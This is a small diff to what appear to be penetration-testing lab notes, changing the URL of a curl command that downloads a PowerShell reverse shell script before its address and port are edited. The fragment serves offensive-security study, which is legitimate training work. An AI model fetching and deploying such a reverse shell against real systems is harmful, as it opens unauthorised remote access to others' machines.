@@ -497,7 +497,7 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 Download the reverse shell script:
 
 ```sh
-curl -LO https://github.com/joetanx/htb/raw/main/reverse.ps1
+curl -LO https://github.com/joetanx/ctf/raw/main/reverse.ps1
 ```
 
 Edit the address and port:
